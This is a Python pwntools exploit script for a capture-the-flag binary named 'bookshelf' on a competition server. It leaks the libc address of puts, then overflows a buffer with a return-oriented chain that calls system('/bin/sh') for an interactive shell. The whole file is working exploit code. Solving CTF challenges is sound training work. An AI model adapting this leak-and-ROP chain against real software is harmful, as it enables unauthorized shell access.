from pwn import *

exe = ELF("./bookshelf")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

# p = process("./bookshelf")
# gdb.attach(p)

p = remote("chal.pctf.competitivecyber.club", 4444)

p.recvuntil(b"Check out")
p.sendline(b"2")
p.recvuntil(b">>")
p.sendline(b"2")
p.recvuntil(b">>")
p.sendline(b"y")

for _ in range(7):
    # p.recvuntil(b">>")
    p.sendline(b"2")
    p.recvuntil(b">>")
    p.sendline(b"2")
    # p.recvuntil(b">>")
    p.sendline(b"y")

# p.recvuntil(b">>")
p.sendline(b"2")
p.recvuntil(b">>")
p.sendline(b"3")
p.recvuntil(b"it's glory ")
puts = int(p.recvline()[:14],16)
libc.address = puts - libc.symbols["puts"]
log.success(f"{hex(libc.address)=}")

p.sendline(b"y")

p.recvuntil(b"Check out")
p.sendline(b"1")
p.recvuntil(b">>")
p.sendline(b"y")
p.sendline(b"a"*40)

pop_rdi_ret = libc.address + 0x2a3e5
ret = 0x40101a
libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

payload = b"A"*0x38
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc_system)
# payload += p64(libc_exit)

p.recvuntil(b"Check out")
p.sendline(b"3")
p.recvline()
p.sendline(payload)

p.interactive()